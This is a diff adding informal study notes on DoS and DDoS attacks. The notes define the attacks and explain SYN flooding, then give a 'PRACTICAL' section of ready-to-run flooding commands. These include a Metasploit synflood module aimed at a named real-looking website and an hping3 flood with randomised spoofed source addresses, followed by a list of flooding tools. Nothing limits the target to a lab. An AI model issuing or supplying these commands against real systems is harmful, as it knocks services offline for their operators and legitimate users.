@@ -1,0 +1,97 @@
+DOS and DDOS ATTACK:
+
+
+DOS ATTACK:Denial of service attack --single source
+DDOS ATTACK:Distributed denial of service attack  --multiple source
+
+DOS:
+>this attack is a puposefull and intentional attack.
+>this attack is done on the target resources/service/
+ webapp/system..etc.
+>this attack make the target system overloaded and 
+ over burdened with number of incoming false or fraud request.
+>and the result comes with that legitimate user
+ is disallowed access to any resources.
+
+*The goal os a DoS attack is not to gain unauthorized
+access to a system or to corrupt data;
+It is to keep the legitimate users away from
+using the system.
+
+Common Symptoms of DoS attack are:
+>slow performance
+>increase in spam emails
+>unavailability of a resource
+>loss of access to a website
+>Disconnection of a wireless or wired internet connection
+>Denial of access to any internet services
+
+some elements:
+
+BOT: if hacked single system
+BOTNET:if hacked multiple systems
+CnC(command and control centre) :
+
+SYN Attack:
+
+ >The attacker sends a large number of syn request to the server(server) with fake source ip addresses.
+ >The target machine sends back a SYN/ACK in response to the request and waits for the ack to complete the session setup.
+ >the target machine doesnt get the response because the source address is fake.
+
+synflooding:
+
+****************************************************************************
+
+https://www.youtube.com/watch?v=1wq6LIjPHkk
+
+
+PRACTICAL:
+
+1.syn 
+>ping kishaadi.com
+>run metasploit msfconsole
+>use auxuliary/dos/tcp/synflooding     <hit enter>
+>select 67 tcp/synflood (copy this)
+
+>use auxiliary/dos/tcp/synflood <hit enter>
+>show option
+>set rhosts <ip of website>
+>run
+
+2.hping3:
+It spoof the multiple different source address and
+sends syn packets on port 0 as default on the target.
+>hping3 --help
+>hping3 --flood --rand-source -S <target ip> -p 80
+>hit enter
+
+3.HOIC: windows 7
+
+2.Goldeneye:
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+windows tool:
+
+1.HOIC
+2.LOIC
+
+Linux tool:
+
+1.Golden eye
+2.HPING3
+3.ping of death
+4.XERXEX
+5.SLOWLORIS:slow down ur own PC..also the target machine or website.
+6.UFONET
+7.METASPLOIT
+
+
+
+
+
+
+
+
+
+ 
